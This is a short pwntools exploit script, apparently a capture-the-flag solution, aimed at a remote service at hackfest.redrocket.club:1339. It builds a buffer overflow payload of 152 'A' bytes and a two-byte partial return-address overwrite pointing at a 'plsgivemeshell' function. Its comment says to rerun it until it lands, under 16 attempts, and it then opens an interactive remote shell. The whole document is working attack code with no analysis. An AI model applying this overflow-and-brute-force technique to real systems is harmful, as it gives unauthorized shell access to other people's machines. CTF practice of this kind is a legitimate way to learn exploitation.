'''
Try run it until you don't get an EOF.
Should need less than 16 attempts.
'''
from pwn import *
import struct

context(arch = 'amd64')

# crafting payload
buffer = 154
payload = [
    b'A'*(buffer - 2),
    struct.pack('<H', 0x1179) # address of plsgivemeshell ends with 179
]
payload = b''.join(payload)

# communication
r = remote('hackfest.redrocket.club', 1339)
print(r.recvline('\n'))     # "Latest security enabled!!!!"
print(r.recvline('\n'))     # "How many bytes do you want to read?"
r.sendline(str(buffer))     # "154"
print(r.recvline('\n'))     # "ok."
r.send(payload)             # "(152*A) + y\x11"

# work in shell
r.interactive()
